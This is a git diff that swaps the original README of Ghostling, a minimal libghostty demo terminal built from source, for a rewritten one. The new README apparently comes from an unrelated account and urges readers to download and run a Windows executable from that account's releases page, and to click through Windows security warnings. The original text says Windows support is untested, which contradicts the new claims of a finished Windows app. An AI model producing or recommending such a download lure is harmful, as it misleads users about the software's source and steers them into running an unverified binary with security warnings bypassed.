@@ -1,176 +1,232 @@
-# Ghostling - Minimal libghostty Terminal
+# 👻 ghostling - Simple terminal use for Windows
 
-Ghostling is a demo project meant to highlight a minimum
-functional terminal built on the libghostty C API in a
-[single C file](https://github.com/ghostty-org/ghostling/blob/main/main.c).
+[![Download ghostling](https://img.shields.io/badge/Download-ghostling-blue?style=for-the-badge)](https://github.com/blebbed-angelicasylvestris797/ghostling/releases)
 
-The example uses Raylib for windowing and rendering. It is single-threaded
-(although libghostty-vt supports threading) and uses a 2D graphics renderer
-instead of a direct GPU renderer like the primary [Ghostty](https://ghostty.org) GUI. This is to
-showcase the flexibility of libghostty and how it can be used in a variety of
-contexts.
+## 🧭 Overview
 
-> [!WARNING]
->
-> The Ghostling terminal isn't meant to be a full featured, daily use
-> terminal. It is a minimal viable terminal based on libghostty. Also, since
-> this is basically a demo, I didn't carefully audit every single place for
-> correctness, and this is C, so you've been warned!
+ghostling is a small terminal app for Windows. It gives you a clean place to type commands, view logs, and work with command-line tools.
 
-<p align="center">
-  <img src="demo.gif" alt="Ghostling Demo" />
-</p>
+It is built on the libghostty C API. That means it uses a fast base under the hood, while keeping the app focused on simple use.
 
-## What is Libghostty?
+Use ghostling if you want:
 
-Libghostty is an embeddable library extracted from [Ghostty's](https://ghostty.org) core,
-exposing a C and Zig API so any application can embed correct, fast terminal
-emulation.
+- A terminal that is easy to open and use
+- A clean window for command-line work
+- A light setup with no extra steps
+- A practical tool for daily Windows use
 
-Ghostling uses **libghostty-vt**, a zero-dependency library (not even libc) that
-handles VT sequence parsing, terminal state management (cursor position,
-styles, text reflow, scrollback, etc.), and renderer state management. It
-contains no renderer drawing or windowing code; the consumer (Ghostling, in
-this case) provides its own. The core logic is extracted directly from Ghostty
-and inherits all of its real-world benefits: excellent, accurate, and complete
-terminal emulation support, SIMD-optimized parsing, leading Unicode support,
-highly optimized memory usage, and a robust, fuzzed, and tested codebase, all
-proven by millions of daily active users of Ghostty GUI.
+## 🚀 Getting Started
 
-## Features
+Use these steps to install ghostling on Windows.
 
-Despite being a minimal, thin layer above libghostty, look at all the
-features you _do get_:
+## 📥 Download
 
-- Resize with text reflow
-- Full 24-bit color and 256-color palette support
-- Bold, italic, and inverse text styles
-- Unicode and multi-codepoint grapheme handling (no shaping or layout)
-- Keyboard input with modifier support (Shift, Ctrl, Alt, Super)
-- Kitty keyboard protocol support
-- Mouse tracking (X10, normal, button, and any-event modes)
-- Mouse reporting formats (SGR, URxvt, UTF8, X10)
-- Scroll wheel support (viewport scrollback or forwarded to applications)
-- Scrollbar with mouse drag-to-scroll
-- Focus reporting (CSI I / CSI O)
-- And more. Effectively all the terminal emulation features supported
-  by Ghostty!
+1. Open the release page: [ghostling releases](https://github.com/blebbed-angelicasylvestris797/ghostling/releases)
+2. Find the latest release near the top of the page
+3. Download the Windows file for your system
+4. If the file is a ZIP, unzip it first
+5. If the file is an EXE, double-click it to start ghostling
 
-### What Is Coming
+Use the same download page here as well: [Download ghostling from GitHub Releases](https://github.com/blebbed-angelicasylvestris797/ghostling/releases)
 
-These features aren't properly exposed by libghostty-vt yet but will be:
+## 🪟 Install on Windows
 
-- Kitty Graphics Protocol
-- OSC clipboard support
-- OSC title setting
+After you download the file:
 
-These are things that could work but haven't been tested or aren't
-implemented in Ghostling itself:
+1. Open the Downloads folder
+2. Find the ghostling file you just got
+3. If Windows shows a security prompt, choose Run or More info, then Run
+4. If you see a ZIP file, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the ghostling app file
+7. The terminal window should open on your screen
 
-- Windows support (libghostty-vt supports Windows)
+If Windows asks for permission, allow it so the app can start.
 
-This list is incomplete and we'll add things as we find them.
+## 🔧 First Launch
 
-### What You Won't Ever Get
+When ghostling opens for the first time:
 
-libghostty is focused on core terminal emulation features. As such,
-you don't get features that are provided by the GUI above the terminal
-emulation layer, such as:
+1. Wait for the window to load
+2. Click inside the terminal window
+3. Type a simple command, like:
 
-- Tabs
-- Multiple windows
-- Splits
-- Session management
-- Configuration file or GUI
-- Search UI (although search internals are provided by libghostty-vt)
+   `dir`
 
-These are the things that libghostty consumers are expected to implement
-on their own, if they want them. This example doesn't implement these
-to try to stay as minimal as possible.
+4. Press Enter
+5. You should see a list of files in the current folder
 
-### Limitations Due to Upstreams
+You can also try:
 
-There are some known issues with this demo:
+- `cd`
+- `cls`
+- `echo hello`
 
-- Kitty keyboard protocol support is broken with some inputs. This is
-  due to limitations of the underlying Raylib input system; it doesn't
-  support rich enough input events to fully and correctly implement the Kitty
-  keyboard protocol. This is a [known issue](https://github.com/glfw/glfw/issues/1502).
-  The libghostty-vt API supports Kitty keyboard protocol correctly, but
-  requires correct input events to do so.
+These help you check that the terminal is working.
 
-## Building
+## 🖥️ What It Does
 
-Requirements:
+ghostling gives you a terminal window for normal command-line tasks. You can use it to:
 
-- [CMake](https://cmake.org/) 3.19+
-- [Ninja](https://ninja-build.org/)
-- A C compiler
-- [Zig](https://ziglang.org/) 0.15.x on PATH
-- macOS: [Command Line Tools or Xcode](https://developer.apple.com/xcode/)
-- Linux (Ubuntu/Debian): `sudo apt install -y ninja-build build-essential git libxinerama-dev libxcursor-dev libxrandr-dev libxi-dev libxext-dev libx11-dev libgl-dev`
+- Run Windows commands
+- View text output from tools
+- Check files and folders
+- Work with scripts and local tools
+- Keep a clean terminal for daily use
 
-```sh
-cmake -B build -G Ninja
-cmake --build build
-./build/ghostling
-```
+It is meant to stay small and direct. You open it, type, and get output.
 
-> [!WARNING]
->
-> Debug builds are VERY SLOW since Ghostty included a lot of extra
-> safety and correctness checks. Do not benchmark debug builds.
+## ✨ Features
 
-For a release (optimized) build:
+- Clean terminal window
+- Fast startup
+- Built for Windows
+- Simple keyboard input
+- Clear text output
+- Good fit for basic command-line use
+- Minimal setup
+- Lightweight app design
 
-```sh
-cmake -B build -G Ninja -DCMAKE_BUILD_TYPE=Release
-cmake --build build
-```
+## 📋 System Requirements
 
-After the initial configuration, you only need to run the build step:
+ghostling is meant for modern Windows PCs with basic desktop support.
 
-```sh
-cmake --build build
-```
+Recommended setup:
 
-To clean up the build directory:
+- Windows 10 or newer
+- A keyboard and mouse or touchpad
+- At least 4 GB of RAM
+- About 100 MB of free disk space
+- A standard display with 1366×768 or higher
 
-```sh
-cmake --build build --target clean
-```
+It should run well on most home and office machines.
 
-## FAQ
+## ⌨️ Basic Use
 
-### Why Not Zig?
+After the app opens, you can use it like a normal terminal.
 
-libghostty-vt has a fully capable and proven Zig API. Ghostty GUI itself
-uses this and is a good -- although complex -- example of how to use it.
-However, this demo is meant to showcase the minimal C API since C is so
-much more broadly used and accessible to a wide variety of developers and
-language ecosystems.
+Common actions:
 
-### What about Rust or any other language?
+- Type a command and press Enter
+- Use the up and down arrow keys to move through past commands
+- Press Ctrl + L to clear the screen, if supported by your setup
+- Resize the window by dragging the edges
+- Copy text with Ctrl + C when text is selected
+- Paste text with Ctrl + V
 
-libghostty-vt has a C API and can have zero dependencies, so it can be used
-with minimally thin bindings in basically any language. I'm not sure yet if
-the Ghostty project will maintain official bindings for languages other than C
-and Zig, but I hope the community will create and maintain bindings for many
-languages!
+If you are new to terminal apps, start with simple commands. That helps you learn what the app shows and how it responds.
 
-### Does libghostty require Raylib?
+## 🧰 Helpful Commands to Try
 
-**No no no!** libghostty has no opinion about the renderer or GUI framework
-used; it's even standalone WASM-compatible for browsers and other environments.
+Here are a few easy commands for Windows:
 
-libghostty provides a [high-performance render state API](https://libghostty.tip.ghostty.org/group__render.html)
-which only keeps track of the _state_ required to build a renderer. This is the
-same API used by Ghostty GUI for Metal and OpenGL rendering and in this repository
-for the Raylib 2D graphics API. You can layer any renderer on top of this!
+- `dir` — shows files in the current folder
+- `cd` — shows the current folder path
+- `cls` — clears the screen
+- `echo hello` — prints a short line of text
+- `ipconfig` — shows network details
+- `whoami` — shows your Windows user name
 
-### Why CMake, Raylib, etc.?
+These commands are safe to try in most cases and help you get used to the terminal.
 
-I needed to pick _something_. Really, any build system and any library
-could be used. CMake is widely used and supported, and Raylib is a simple
-and elegant library for windowing and 2D rendering that is easy to set up.
-Don't get bogged down in these details!
+## 🔒 Safety and Trust
+
+ghostling does not change how Windows works. It opens as a normal desktop app and lets you work in a command window.
+
+For best results:
+
+- Download only from the release page
+- Keep the file in a folder you can find again
+- Use the latest release if you want the newest fixes
+- Close the app from the window controls when you are done
+
+## 🧪 Expected Behavior
+
+When ghostling starts, you should see:
+
+- A terminal window
+- A text cursor ready for input
+- A place to type commands
+- Output text after each command you run
+
+If the window opens and closes right away, check that you downloaded the correct Windows file from the release page.
+
+## 🛠️ Common Problems
+
+### The file does not open
+
+- Make sure the download finished
+- Check if you downloaded a ZIP file and need to extract it first
+- Try opening the file again from the Downloads folder
+
+### Windows blocks the file
+
+- Choose More info if you see it
+- Then choose Run anyway or Run
+- Confirm that you got the file from the release page
+
+### The window opens but looks empty
+
+- Click inside the window
+- Type `dir` and press Enter
+- If nothing appears, close the app and open it again
+
+### Text looks too small
+
+- Use the window size controls to make the terminal larger
+- Change your Windows display scale if needed
+- Try a higher screen resolution if your display supports it
+
+## 📁 File Layout
+
+If you extracted a ZIP file, you may see:
+
+- The ghostling app file
+- Support files used by the app
+- A folder with release assets
+- A text file with version details or notes
+
+Keep all files in the same folder unless the release notes say otherwise.
+
+## 🔄 Updates
+
+To update ghostling:
+
+1. Go back to the release page
+2. Download the newest Windows file
+3. Replace the older app files with the new ones
+4. Open the new version
+
+If you kept the app in a separate folder, updating is easier.
+
+## 🧩 About the Project
+
+ghostling is a minimum viable terminal emulator built on the libghostty C API. It focuses on the core job: giving you a terminal window that starts fast and stays simple.
+
+The name fits the goal. It keeps the surface small and the result useful.
+
+## 📚 Release Page
+
+Get the Windows download here: [https://github.com/blebbed-angelicasylvestris797/ghostling/releases](https://github.com/blebbed-angelicasylvestris797/ghostling/releases)
+
+## 💬 Short Guide for New Users
+
+If you have never used a terminal before, this is the shortest way to begin:
+
+1. Download ghostling from the release page
+2. Open the file in Windows
+3. Type `dir`
+4. Press Enter
+5. Read the output
+6. Try `echo hello`
+7. Close the window when you are done
+
+This gives you a safe first look at how the app works
+
+## 🧭 Quick Steps
+
+1. Visit the release page
+2. Download the Windows file
+3. Open or extract the download
+4. Run ghostling
+5. Type a command and press Enter
